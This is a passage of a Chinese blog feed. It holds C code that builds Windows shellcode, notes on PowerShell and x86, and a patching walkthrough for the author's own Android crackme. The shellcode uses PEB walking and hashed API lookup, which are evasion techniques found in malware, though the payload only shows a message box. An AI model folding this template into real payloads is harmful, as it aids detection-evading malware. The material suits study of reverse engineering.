UINT HashrGetProcAddress = 0x3f8aaa7e;    for (UINT i = 0; i &lt; pExportDir-&gt;NumberOfNames; i++) {        LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);        //if (!__STRCMPI__(pFuncName, strGetProcAddress)) {        if (__CalcHash__(pFuncName) == HashrGetProcAddress) {            getprocaddressapi = (GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);        }        //else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) {        else if (__CalcHash__(pFuncName) == HashrLoadLibraryA) {            loadlibrarywapi = (LoadLibraryWAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);        }        if (getprocaddressapi != nullptr &amp;&amp; loadlibrarywapi != nullptr) {            messageboxapi = (MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api);            messageboxapi(NULL, MeassageText, NULL, 0);            return;        }    }}inline BOOL __ISUPPER__(__in CHAR c) {    return (&#39;A&#39; &lt;= c) &amp;&amp; (c &lt;= &#39;Z&#39;);};inline CHAR __TOLOWER__(__in CHAR c) {    return __ISUPPER__(c) ? c - &#39;A&#39; + &#39;a&#39; : c;};UINT __STRLEN__(__in LPSTR lpStr1){    UINT i = 0;    while (lpStr1[i] != 0x0)        i++;    return i;}UINT __STRLENW__(__in LPWSTR lpStr1){    UINT i = 0;    while (lpStr1[i] != L&#39;\0&#39;)        i++;    return i;}LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2){    CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);    if (!c)        return lpStr1;    UINT dwLen = __STRLENW__(lpStr2);    do    {        CHAR sc;        do        {            sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);            if (!sc)                return NULL;        } while (sc != c);    } while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);    return (lpStr1 - 1); // FIXME -2 ?}INT __STRCMPI__(    __in LPSTR lpStr1,    __in LPSTR lpStr2){    int  v;    CHAR c1, c2;    do    {        c1 = *lpStr1++;        c2 = *lpStr2++;        // The casts are necessary when pStr1 is shorter &amp; char is signed         v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);    } while ((v == 0) &amp;&amp; (c1 != &#39;\0&#39;) &amp;&amp; (c2 != &#39;\0&#39;));    return v;}INT __STRNCMPIW__(    __in LPWSTR lpStr1,    __in LPWSTR lpStr2,    __in DWORD dwLen){    int  v;    CHAR c1, c2;    do {        dwLen--;        c1 = ((PCHAR)lpStr1++)[0];        c2 = ((PCHAR)lpStr2++)[0];        /* The casts are necessary when pStr1 is shorter &amp; char is signed */        v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);    } while ((v == 0) &amp;&amp; (c1 != 0x0) &amp;&amp; (c2 != 0x0) &amp;&amp; dwLen &gt; 0);    return v;}LPSTR __STRCAT__(    __in LPSTR    strDest,    __in LPSTR strSource){    LPSTR d = strDest;    LPSTR s = strSource;    while (*d) d++;    do { *d++ = *s++; } while (*s);    *d = 0x0;    return strDest;}LPVOID __MEMCPY__(    __in LPVOID lpDst,    __in LPVOID lpSrc,    __in DWORD dwCount){    LPBYTE s = (LPBYTE)lpSrc;    LPBYTE d = (LPBYTE)lpDst;    while (dwCount--)        * d++ = *s++;    return lpDst;}UINT __CalcHash__(    __in LPVOID lpStr){    UINT ApiHash = 0;    LPBYTE s = (LPBYTE)lpStr;    do    {        ApiHash = (ApiHash &lt;&lt; 7) + (ApiHash &gt;&gt; 25) + *s;    } while (*s++);    return ApiHash;}HANDLE GetKernel32Handle() {    HANDLE hKernel32 = INVALID_HANDLE_VALUE;#ifdef _WIN64    PPEB lpPeb = (PPEB)__readgsqword(0x60);#else    PPEB lpPeb = (PPEB)__readfsdword(0x30);#endif    PLIST_ENTRY pListHead = &amp;lpPeb-&gt;Ldr-&gt;InMemoryOrderModuleList;    PLIST_ENTRY pListEntry = pListHead-&gt;Flink;    WCHAR strDllName[MAX_PATH];    WCHAR strKernel32[] = { &#39;k&#39;, &#39;e&#39;, &#39;r&#39;, &#39;n&#39;, &#39;e&#39;, &#39;l&#39;, &#39;3&#39;, &#39;2&#39;, &#39;.&#39;, &#39;d&#39;, &#39;l&#39;, &#39;l&#39;, L&#39;\0&#39; };    while (pListEntry != pListHead) {        PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);        if (pModEntry-&gt;FullDllName.Length) {            DWORD dwLen = pModEntry-&gt;FullDllName.Length;            __MEMCPY__(strDllName, pModEntry-&gt;FullDllName.Buffer, dwLen);            strDllName[dwLen / sizeof(WCHAR)] = L&#39;\0&#39;;            if (__STRSTRIW__(strDllName, strKernel32)) {                hKernel32 = pModEntry-&gt;DllBase;                break;            }        }        pListEntry = pListEntry-&gt;Flink;    }    return hKernel32;}//void __declspec(naked) END_SHELLCODE(void) {}void END_SHELLCODE(void) {}int main(){    shell_code();    FILE* output_file;#ifdef _WIN64    fopen_s(&amp;output_file, &quot;shellcode_x64.bin&quot;, &quot;wb&quot;);#else    fopen_s(&amp;output_file, &quot;shellcode_x32.bin&quot;, &quot;wb&quot;);#endif    fwrite(shell_code, (int)END_SHELLCODE - (int)shell_code, 1, output_file);    fclose(output_file);    return 0;}</code></pre><p>稍微修改了一点，使用<strong>x64</strong>位编译就可以生成<strong>64位shellcode</strong>，使用<strong>x32</strong>就能生成32位<strong>shellcode</strong>。</p><p>使用了<strong>hash函数名</strong>的方式去找API，不用开那么大栈空间</p><p>总结一下：</p><p>类似<code>memcpy、strlen、strcat</code>等等常用函数，都自行实现，Shellcode的第一个函数要写在开始处。</p><p>C++ 中字符数组定义格式有下面三种</p><pre><code class="c++">    const char* str1 = &quot;I am Str1!&quot;;    char str2[] = &quot;I am Str2!&quot;;    char str3[] = { &#39;H&#39;,&#39;e&#39;,&#39;l&#39;,&#39;l&#39;,&#39;o&#39;,&#39;.&#39;,&#39;W&#39;,&#39;o&#39;,&#39;l&#39;,&#39;r&#39;,&#39;d&#39;,&#39;!&#39;,0 };</code></pre><p>前面两种都是将字符串保存在<code>rdata</code>段中，第三种方式是将字符串保存在栈中，最后的0表示’\0’,如果没有结束标志，可能会操作到栈后面的数据。</p>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Powershell 官方例子</title>
    <link href="/cray/2020/03/02/Powershell%20%E5%AE%98%E6%96%B9%E4%BE%8B%E5%AD%90/"/>
    <url>/cray/2020/03/02/Powershell%20%E5%AE%98%E6%96%B9%E4%BE%8B%E5%AD%90/</url>
    
    <content type="html"><![CDATA[<h3 id="powershell-官方例子说明"><a href="#powershell-官方例子说明" class="headerlink" title="powershell 官方例子说明"></a>powershell 官方例子说明</h3><p>​    全部例子来源自<a href="https://docs.microsoft.com/zh-cn/powershell/scripting/samples/sample-scripts-for-administration?view=powershell-7" target="_blank" rel="noopener">示例脚本</a></p><h3 id="使用对象"><a href="#使用对象" class="headerlink" title="使用对象"></a>使用对象</h3><h4 id="查看对象结构-Get-Member"><a href="#查看对象结构-Get-Member" class="headerlink" title="查看对象结构 (Get-Member)"></a>查看对象结构 (Get-Member)</h4><blockquote><p> <code>Get-Process | Get-Member | Out-Host -Paging</code></p></blockquote><p>获取进程列表，再获取他们各自的成员信息，最后按页输出</p><blockquote><p> <code>Get-Process | Get-Member -MemberType Properties</code> </p><p>MemberType 的允许值有 AliasProperty、CodeProperty、Property、NoteProperty、ScriptProperty、Properties、PropertySet、Method、CodeMethod、ScriptMethod、Methods、ParameterizedProperty、MemberSet 以及 All。 </p></blockquote><h4 id="选择对象部件-Select-Object"><a href="#选择对象部件-Select-Object" class="headerlink" title="选择对象部件 (Select-Object)"></a>选择对象部件 (Select-Object)</h4><blockquote><p><code>Get-CimInstance -Class Win32_LogicalDisk | Select-Object -Property Name,FreeSpace</code></p></blockquote><p>利用WMI win32-logicaldisk类来获取服务器的磁盘空间使用率的信息，然后选择性的打印出 Name和FreeSpace两个项目</p><p>但是FreeSpace是 uint64格式的</p><pre><code class="powershell">Get-CimInstance -Class Win32_LogicalDisk |  Select-Object -Property Name, @{    label=&#39;FreeSpace Cray&#39;    expression={($_.FreeSpace/1GB).ToString(&#39;F2&#39;)}  }</code></pre><p>第一行是获取基本数据，第二行是选择对象的属性，分别是Name和一个自定义的</p><p> <code>$_</code> 来指代管道中的当前对象 </p><p><code>ToString(&#39;F2&#39;)</code> 表示保留两位小数</p><h4 id="从管道中删除对象-Where-Object"><a href="#从管道中删除对象-Where-Object" class="headerlink" title="从管道中删除对象 (Where-Object)"></a>从管道中删除对象 (Where-Object)</h4><pre><code class="powershell">Get-CimInstance -Class Win32_SystemDriver |  Where-Object {$_.State -eq &quot;Running&quot;} |    Where-Object {$_.StartMode -eq &quot;Manual&quot;} |      Format-Table -Property Name,DisplayName </code></pre><p><code>Where-Object</code> 作用就是筛选</p><table><thead><tr><th align="center">比较运算符</th><th align="center">含义</th><th align="center">示例（返回 True）</th></tr></thead><tbody><tr><td align="center">-eq</td><td align="center">等于</td><td align="center">1 -eq 1</td></tr><tr><td align="center">-ne</td><td align="center">不等于</td><td align="center">1 -ne 2</td></tr><tr><td align="center">-lt</td><td align="center">小于</td><td align="center">1 -lt 2</td></tr><tr><td align="center">-le</td><td align="center">小于或等于</td><td align="center">1 -le 2</td></tr><tr><td align="center">-gt</td><td align="center">大于</td><td align="center">2 -gt 1</td></tr><tr><td align="center">-ge</td><td align="center">大于或等于</td><td align="center">2 -ge 1</td></tr><tr><td align="center">-like</td><td align="center">相似（文本的通配符比较）</td><td align="center">“file.doc” -like “f*.do?”</td></tr><tr><td align="center">-notlike</td><td align="center">不相似（文本的通配符比较）</td><td align="center">“file.doc” -notlike “p*.doc”</td></tr><tr><td align="center">-contains</td><td align="center">包含</td><td align="center">1,2,3 -contains 1</td></tr><tr><td align="center">-notcontains</td><td align="center">不包含</td><td align="center">1,2,3 -notcontains 4</td></tr></tbody></table><pre><code class="powershell">Get-CimInstance -Class Win32_SystemDriver |  Where-Object {($_.State -eq &#39;Running&#39;) -and ($_.StartMode -eq &#39;Manual&#39;)} |    Format-Table -Property Name,DisplayName</code></pre><p>如果筛选条件有多个，可以使用逻辑运算符</p><p><code>Format-Table</code> 可以格式化最后的输出格式</p><table><thead><tr><th align="center">Logical and；如果两侧都为 True，则返回 True</th><th align="center">-and</th><th align="center">(1 -eq 1) -and (2 -eq 2)</th></tr></thead><tbody><tr><td align="center">Logical or；如果某一侧为 True，则返回 True</td><td align="center">-or</td><td align="center">(1 -eq 1) -or (1 -eq 2)</td></tr><tr><td align="center">Logical not；反转 True 和 False</td><td align="center">-not</td><td align="center">-not (1 -eq 2)</td></tr><tr><td align="center">Logical not；反转 True 和 False</td><td align="center">!</td><td align="center">!(1 -eq 2)</td></tr></tbody></table><h4 id="对对象进行排序-Sort-Object"><a href="#对对象进行排序-Sort-Object" class="headerlink" title="对对象进行排序( Sort-Object )"></a>对对象进行排序( Sort-Object )</h4><p>简单使用</p><pre><code class="powershell">Get-ChildItem |  Sort-Object -Property CreationTime -Descending  |  #Select-Object -Property Name,CreationTime  Format-Table -Property Name,CreationTime</code></pre><p>运用哈希排序的复杂使用</p><pre><code class="powershell">Get-ChildItem |  Sort-Object -Property @{ Expression = { $_.LastWriteTime - $_.CreationTime }; Descending = $true } |  Format-Table -Property LastWriteTime, CreationTime</code></pre><p>对目录中的文件，按最后写日期-创建日期大小进行降序排列</p><h4 id="创建-NET-和-COM-对象-New-Object"><a href="#创建-NET-和-COM-对象-New-Object" class="headerlink" title="创建 .NET 和 COM 对象 (New-Object)"></a>创建 .NET 和 COM 对象 (New-Object)</h4><p>创建某些COM对象</p><pre><code class="powershell">New-Object -ComObject WScript.ShellNew-Object -ComObject WScript.NetworkNew-Object -ComObject Scripting.DictionaryNew-Object -ComObject Scripting.FileSystemObject</code></pre><p>一个使用<strong>WScript.Shell</strong> 创建桌面快捷方式并执行</p><pre><code class="powershell">$WshShell = New-Object -ComObject WScript.Shell$calclink = $WshShell.CreateShortcut(&quot;C:\Users\Cray\Desktop\calc.lnk&quot;)$calclink.TargetPath = &quot;C:\WINDOWS\system32\calc.exe&quot;$calclink.Save()$WshShell.run(&quot;C:\Users\Cray\Desktop\calc.lnk&quot;)</code></pre><h4 id="使用静态类和方法"><a href="#使用静态类和方法" class="headerlink" title="使用静态类和方法"></a>使用静态类和方法</h4><p>静态类不能使用New-Object来创建</p><p>无需创建即可使用</p><p>使用时用<strong>[ ]</strong>调用，通常使用静态类的静态方法</p><pre><code class="powershell">[System.Environment] | Get-Member  #此类的详细信息[System.Environment] | Get-Member -Static #查看静态成员</code></pre><p>调用方式使用  <strong>::</strong></p><pre><code class="powershell">[System.Environment]::OSVersion </code></pre><p>还有很多静态类，比如 math</p><pre><code class="powershell">PS&gt; [System.Math]::Sqrt(9)3PS&gt; [System.Math]::Pow(2,3)8PS&gt; [System.Math]::Floor(3.3)3PS&gt; [System.Math]::Floor(-3.3)-4PS&gt; [System.Math]::Ceiling(3.3)4PS&gt; [System.Math]::Ceiling(-3.3)-3PS&gt; [System.Math]::Max(2,7)7PS&gt; [System.Math]::Min(2,7)2PS&gt; [System.Math]::Truncate(9.3)9PS&gt; [System.Math]::Truncate(-9.3)-9</code></pre><h4 id="获取-WMI-对象-Get-CimInstance"><a href="#获取-WMI-对象-Get-CimInstance" class="headerlink" title="获取 WMI 对象 (Get-CimInstance)"></a>获取 WMI 对象 (Get-CimInstance)</h4><blockquote><p>Windows Management Instrumentation (WMI) 是 Windows 系统管理的核心技术，因为它以统一的方式公开大量信息。 由于 WMI 可实现的效果，用于访问 WMI 对象的 PowerShell cmdlet <code>Get-CimInstance</code> 是进行实际工作最有用的对象之一 </p></blockquote><p>列出本机上可用的WMI类列表</p><pre><code class="powershell">Get-CimClass -Namespace root/CIMV2 |  Where-Object CimClassName -like Win32* |    Select-Object CimClassName</code></pre><p>使用WMI获取系统信息  Namespace 默认为 <code>root/CIMV2</code> </p><p><code>Get-CimInstance -Class Win32_OperatingSystem</code></p><p>他有很多属性，都可以查看。</p><p>例如</p><pre><code class="powershell"> Get-CimInstance -Class Win32_OperatingSystem |  select -Property Free*, @{ label = &quot;TotalVirtualMemorySize&quot;  expression = {($_.TotalVirtualMemorySize/1MB).ToString(&quot;F0&quot;)}}  | Format-Table </code></pre><p>或者下面这样都是可以的</p><pre><code class="powershell">Get-CimInstance Win32_OperatingSystem |Format-List Total*Memory*, Free*</code></pre><h3 id="管理计算机"><a href="#管理计算机" class="headerlink" title="管理计算机"></a>管理计算机</h3><p>该节有大量关于计算机的例子，建议直接看<a href="https://docs.microsoft.com/zh-cn/powershell/scripting/samples/collecting-information-about-computers?view=powershell-7" target="_blank" rel="noopener">官方文档</a></p><blockquote><p>若要完整显示具有极长名称的临时服务的名称，可能需要使用具有 AutoSize 和 Wrap 参数的 <code>Format-Table</code>，用于优化列宽并允许较长名称换行而不是被截断 </p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode基础</title>
    <link href="/cray/2020/03/02/shellcode%E5%9F%BA%E7%A1%80/"/>
    <url>/cray/2020/03/02/shellcode%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="shellcode-基础"><a href="#shellcode-基础" class="headerlink" title="shellcode 基础"></a>shellcode 基础</h3><p>参考微软<a href="https://docs.microsoft.com/zh-cn/powershell/scripting/how-to-use-docs?view=powershell-7" target="_blank" rel="noopener">官方文档</a></p><p>几个特性：</p><blockquote><ol><li>.NET Core可跨平台，powershell6可在Mac Linux平台使用，大气</li><li>Win10自带组建，功能强大</li></ol></blockquote><h4 id="了解Powershell"><a href="#了解Powershell" class="headerlink" title="了解Powershell"></a>了解Powershell</h4><ol><li>输出基于对象<ul><li>PowerShell cmdlet 旨在处理对象</li><li>在大多数情况下，可以使用标准 PowerShell 对象语法直接访问数据的各部分</li></ul></li><li>命令系列是可扩展的<ul><li>可以自己实现函数</li><li>支持批处理文件的脚本</li></ul></li><li>PowerShell 处理控制台输入和显示<ul><li>在cmdlet 后使用 <strong>-？</strong>可显示关于此命令的帮助</li></ul></li><li>PowerShell 使用某些 C# 语法</li></ol><h4 id="了解powershell的名称"><a href="#了解powershell的名称" class="headerlink" title="了解powershell的名称"></a>了解powershell的名称</h4><pre><code> 1. Cmdlet 使用谓词-名词的名称来减少命令记忆 - [PowerShell 批准的谓词]( https://docs.microsoft.com/zh-cn/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7 ) 2. Cmdlet 使用标准参数 - 参数主要通过**-？**获取，还有通用参数如 WhatIf、Confirm、Verbose、Debug、Warn、ErrorAction、ErrorVariable、OutVariable 和 OutBuffer3. 建议的参数名称-   加上方便人理解： Force 、Exclude 、Include 、PassThru 、Path 和 CaseSensitive </code></pre><h4 id="使用熟悉的命令名称"><a href="#使用熟悉的命令名称" class="headerlink" title="使用熟悉的命令名称"></a>使用熟悉的命令名称</h4><p>​    <strong>1. Powershell 支持常见的Unix 和cmd.exe 的命令</strong></p><p>​    </p><table><thead><tr><th align="left"></th><th align="left"></th><th align="left"></th><th align="left"></th></tr></thead><tbody><tr><td align="left">cat</td><td align="left">dir</td><td align="left">mount</td><td align="left">rm</td></tr><tr><td align="left">cd</td><td align="left">echo</td><td align="left">move</td><td align="left">rmdir</td></tr><tr><td align="left">chdir</td><td align="left">erase</td><td align="left">popd</td><td align="left">sleep</td></tr><tr><td align="left">clear</td><td align="left">h</td><td align="left">ps</td><td align="left">sort</td></tr><tr><td align="left">cls</td><td align="left">history</td><td align="left">pushd</td><td align="left">tee</td></tr><tr><td align="left">copy</td><td align="left">kill</td><td align="left">pwd</td><td align="left">type</td></tr><tr><td align="left">del</td><td align="left">lp</td><td align="left">r</td><td align="left">write</td></tr><tr><td align="left">diff</td><td align="left">ls</td><td align="left">ren</td><td align="left"></td></tr></tbody></table><ol start="2"><li><p>别名相关操作</p><p> <code>Get-Command -Noun Alias</code></p></li></ol><h4 id="获取详细的帮助信息"><a href="#获取详细的帮助信息" class="headerlink" title="获取详细的帮助信息"></a>获取详细的帮助信息</h4><ol><li>获取有关 cmdlet 的帮助<ul><li>常规帮助 <strong>Get-Help cmdlet</strong>、<strong>man cmdlet</strong> 、<strong>cmdlet   -?</strong> </li><li>获取到参数的帮助  <strong>Get-Help cmdlet -Full</strong> </li></ul></li></ol><h4 id="使用变量存储对象"><a href="#使用变量存储对象" class="headerlink" title="使用变量存储对象"></a>使用变量存储对象</h4><ol><li>使用<strong>$</strong>表示变量</li><li>Get-Member $env:获取变量的信息<ul><li>可以创建设置键值对，例：<code>$env:LIB_PATH=&#39;/usr/local/lib&#39;</code></li></ul></li></ol><h4 id="了解-PowerShell-管道"><a href="#了解-PowerShell-管道" class="headerlink" title="了解 PowerShell 管道"></a>了解 PowerShell 管道</h4><p>​    主要是方法和属性的使用，下面举个例子</p><p>​    <code>Get-Location</code> 获取一个pathInfo</p><p>​    <code>Get-Location | Get-Member</code>获取这个类的方法和属性</p><p>​    想要使用必须先实例化，传给一个变量</p><p>​    <code>$myLocal = Get-Location</code>实例化，这个<code>$myLocal</code>拥有<code>Get-Location</code>的全部方法和属性</p><p>​    比如<code>$myloc.Drive.Used</code>获取所在驱动内存使用大小，通过<code>Get-Member</code>获取详情</p><h4 id="术语表"><a href="#术语表" class="headerlink" title="术语表"></a>术语表</h4><p>powershell的常用术语</p><p>建议中英对照看，翻译的有些不易理解</p><p><a href="https://docs.microsoft.com/zh-cn/powershell/scripting/learn/windows-powershell-glossary?view=powershell-7" target="_blank" rel="noopener">中文</a></p><p><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/windows-powershell-glossary?view=powershell-77" target="_blank" rel="noopener">英文</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Inter 汇编基础</title>
    <link href="/cray/2020/02/14/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%B1%87%E7%BC%96/"/>
    <url>/cray/2020/02/14/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E6%B1%87%E7%BC%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://bbs.pediy.com/thread-77508.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-77508.htm</a><br><a href="https://blog.csdn.net/Apollon_krj/article/details/77524601" target="_blank" rel="noopener">https://blog.csdn.net/Apollon_krj/article/details/77524601</a><br>x86指令集设计上就只允许是寄存器和寄存器或寄存器和内存间移动</p><p>x86 profix:<br>26：在指令序列里是：prefix部分，作用是调整内存操作数的段选择子<br>66：在指令序列里是：prefix 部分，作用是调整操作数的缺省大小<br>2E: CS<br>3E: DS<br>26: ES<br>64: FS<br>65: GS<br>36: SS<br>F0: locl指令<br>F2: repne<br>F3: rep repz</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214220708.png" srcset="/cray/img/loading.gif" alt="20200214220708.png"></p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214221252.png" srcset="/cray/img/loading.gif" alt="20200214221252.png"></p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214221520.png" srcset="/cray/img/loading.gif" alt="20200214221520.png"></p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215175201.png" srcset="/cray/img/loading.gif" alt="20200215175201.png"></p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215174932.png" srcset="/cray/img/loading.gif" alt="20200215174932.png"></p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215175337.png" srcset="/cray/img/loading.gif" alt="20200215175337.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向第一个CrakeMe</title>
    <link href="/cray/2019/12/14/Android%E7%AC%AC%E4%B8%80%E4%B8%AACrakeMe/"/>
    <url>/cray/2019/12/14/Android%E7%AC%AC%E4%B8%80%E4%B8%AACrakeMe/</url>
    
    <content type="html"><![CDATA[<p>自己写的第一个Android CrakeMe 也是为了练手</p><p>随意输入参数为错误，始入正确flag能打印<code>Success</code></p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214193723.png" srcset="/cray/img/loading.gif" alt="20191214193723.png"></p><p>配合使用上一篇的流程破解</p><h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><p>使用<code>apktool</code>解包</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214193422.png" srcset="/cray/img/loading.gif" alt="20191214193422.png"></p><p>拿到了Smali文件</p><h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><p>这里使用<code>jadx</code>发编译</p><p>知道了成功会打印<code>Success</code>,直接搜索关键字就好了</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214194137.png" srcset="/cray/img/loading.gif" alt="20191214194137.png"></p><p>双击进去后就可以看到关键的代码，可以使用引用查看函数调用情况</p><p>这里看到的<code>JAVA</code>代码是<code>Smali</code>反编译得到的，所以中文都是使用的<code>Unicode</code>表示,这也表示以后搜索代码中的关键字需要转化为<code>Unicode</code>字符集去搜索</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214194305.png" srcset="/cray/img/loading.gif" alt="20191214194305.png"></p><p>很简单的逻辑就是改跳转，把 <code>==</code>改为<code>!=</code>这类的相反的比较</p><p>我们不能直接修改JAVA代码，要修改JVM虚拟机读的<code>Smali</code>语句</p><p>这和你要破解windows程序，不能在IDA中直接改F5出来伪代码，要修改汇编一个道理</p><p>我们要修改的代码位置如下</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214200228.png" srcset="/cray/img/loading.gif" alt="20191214200228.png"></p><p>找到相应的文件，使用编辑器打开，直接修改Smali语句就好了</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214200613.png" srcset="/cray/img/loading.gif" alt="20191214200613.png"></p><p>这里将<code>if-eqz</code>修改为<code>if-nez</code></p><p>然后保存退出</p><h2 id="回编译APK"><a href="#回编译APK" class="headerlink" title="回编译APK"></a>回编译APK</h2><p>这里需要将修改后的文件重新编译为APK，才能安装</p><p>使用命令</p><p><code>apktool b [Folder_Paht]</code></p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201012.png" srcset="/cray/img/loading.gif" alt="20191214201012.png"></p><p>成功后会在<code>Folder_Paht/dist</code>下创建新的打包文件，但是现在不能安装，没有签名文件，需要给这个文件签一个制作者的<code>sign</code></p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201139.png" srcset="/cray/img/loading.gif" alt="20191214201139.png"></p><p>具体命令</p><p><code>jarsigner -verbose -keystore key.keystore D:\Tools\ApkTools\Hello\dist\Hello.apk key.keystore</code></p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201718.png" srcset="/cray/img/loading.gif" alt="20191214201718.png"></p><p>放入模拟器，无论输入什么都会输出Success(除了正确密码…)</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191214201908.png" srcset="/cray/img/loading.gif" alt="20191214201908.png"></p><p>以上就是通过修改Smali语句实现的暴力破解</p><p>下面详细分析一下Smali语句</p><p>源码，注意空格在反编译的Smali语句中也算一行</p><p><img src="https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216101748.png" srcset="/cray/img/loading.gif" alt="20191216101748.png"></p><pre><code class="Smali">.class public Lcom/Crat/changeme/MainActivity;#类名.super Landroidx/appcompat/app/AppCompatActivity;#父类.source &quot;MainActivity.java&quot;#对应的JAVA源代码文件名# direct methods.method public constructor &lt;init&gt;()V    .locals 0    .line 11    #调用父类的AppCompatActivity初始化函数，已经识别为init    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-&gt;&lt;init&gt;()V                        #无返回值    return-void.end method# virtual methods.method public Pushed(Landroid/view/View;)V    .locals 8    .param p1, &quot;view&quot;    # Landroid/view/View;    .line 21    # v0 = 0x7f070042    const v0, 0x7f070042    #调用MainActivity.findViewById(int v0)  返回值是 View 类型    invoke-virtual {p0, v0}, Lcom/Crat/changeme/MainActivity;-&gt;findViewById(I)Landroid/view/View;    #将返回值(对象)赋给v0    move-result-object v0    #强制类型转换，将v0转换为TextView类型    check-cast v0, Landroid/widget/TextView;    .line 22    #声明变量 TextView Name  来保存v0寄存器的值    .local v0, &quot;Name&quot;:Landroid/widget/TextView;    const v1, 0x7f0700ab    invoke-virtual {p0, v1}, Lcom/Crat/changeme/MainActivity;-&gt;findViewById(I)Landroid/view/View;    move-result-object v1    check-cast v1, Landroid/widget/TextView;    .line 23    .local v1, &quot;Text2&quot;:Landroid/widget/TextView;    const v2, 0x7f070054    invoke-virtual {p0, v2}, Lcom/Crat/changeme/MainActivity;-&gt;findViewById(I)Landroid/view/View;    move-result-object v2    check-cast v2, Landroid/widget/TextView;    .line 24    .local v2, &quot;Edit2&quot;:Landroid/widget/TextView;    #下面一句翻译为java语句是 v2.getText() 函数返回类型为char类型的序列    #CharSequence和String 详情请看：https://blog.csdn.net/iblade/article/details/78111223    invoke-virtual {v2}, Landroid/widget/TextView;-&gt;getText()Ljava/lang/CharSequence;    move-result-object v3    #给上面的CharSequence转换为String类型    invoke-interface {v3}, Ljava/lang/CharSequence;-&gt;toString()Ljava/lang/String;    move-result-object v3    .line 25    #将获得的String字符赋值给InputKey局部变量中    .local v3, &quot;InputKey&quot;:Ljava/lang/String;    const-string v4, &quot;&quot;    .line 27    .local v4, &quot;TmpFlag&quot;:Ljava/lang/String;    # 下面两句表示 int i = 0    const/4 v5, 0x0    .local v5, &quot;i&quot;:I    :goto_0    #获取到输入字符串的长度    invoke-virtual {v3}, Ljava/lang/String;-&gt;length()I    #将长度返回给v6寄存器保存    move-result v6    #如果v5&gt;=v6 就跳转    if-ge v5, v6, :cond_0    .line 29    new-instance v6, Ljava/lang/StringBuilder;    invoke-direct {v6}, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;    invoke-virtual {v3, v5}, Ljava/lang/String;-&gt;charAt(I)C    move-result v7    #xor-int/lit8 v7, v7, 0xa    v7(前) = v7(后) ^  0xa    xor-int/lit8 v7, v7, 0xa    int-to-char v7, v7    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;-&gt;append(C)Ljava/lang/StringBuilder;    invoke-virtual {v6}, Ljava/lang/StringBuilder;-&gt;toString()Ljava/lang/String;    move-result-object v4    .line 27    #add-int/lit8 v5, v5, 0x1  v5(前) = v5(后) + 1    add-int/lit8 v5, v5, 0x1    goto :goto_0    .line 32    .end local v5    # &quot;i&quot;:I    :cond_0    #Sting v5 = &quot;lfkmqBoffe*}exfnw&quot;    const-string v5, &quot;lfkmqBoffe*}exfnw&quot;    #v4.equals(v5) 返回值是boolean    invoke-virtual {v4, v5}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z    move-result v5    #v5不等于0跳转    if-nez v5, :cond_1    .line 34    const-string v5, &quot;\u606d\u559c\u6b63\u786e\uff01&quot;    invoke-virtual {v0, v5}, 